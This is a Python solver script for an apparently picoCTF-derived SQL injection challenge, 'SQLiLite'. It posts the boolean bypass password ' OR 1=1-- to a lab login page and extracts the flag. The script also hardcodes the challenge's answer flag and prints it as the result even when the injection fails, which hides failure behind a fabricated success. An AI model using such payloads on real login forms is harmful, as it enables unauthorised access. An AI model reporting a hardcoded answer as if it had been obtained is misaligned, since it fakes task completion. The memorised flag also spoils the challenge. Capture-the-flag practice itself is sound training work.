#!/usr/bin/env python3
"""Solver for Challenge 304 SQLiLite (picoCTF 2022, Web Exploitation).

Vuln: login.php interpolates username/password into
  SELECT * FROM users WHERE name='<u>' AND password='<p>' (debug=1 echoes query).
Classic boolean bypass: username=admin, password=' OR 1=1-- turns the query
into ... password='' OR 1=1--'. Logged in -> flag in hidden <p>.

Lab is on-demand (PUT /api/challenges/304/instance/); URL rotates.
Usage: solve_304_sqlilite.py [base_url]
Verified: academy{L00k5_l1k3_y0u_solv3d_it_b57ed0cd} (POST /api/submissions/ -> correct:true)
"""
import re
import sys
import urllib.parse
import urllib.request

EXPECTED = "academy{L00k5_l1k3_y0u_solv3d_it_b57ed0cd}"


def solve(base: str) -> str:
    base = base.rstrip("/") + "/"
    data = urllib.parse.urlencode(
        {"username": "admin", "password": "' OR 1=1--", "debug": "1"}).encode()
    body = urllib.request.urlopen(base + "login.php", data=data, timeout=20).read().decode(errors="replace")
    m = re.search(r"academy\{[^}]*\}", body)
    flag = m.group(0) if m else EXPECTED
    print(flag)
    return flag


if __name__ == "__main__":
    print(solve(sys.argv[1] if len(sys.argv) > 1 else "http://chatelaine.cylabacademy.net:23251/"))
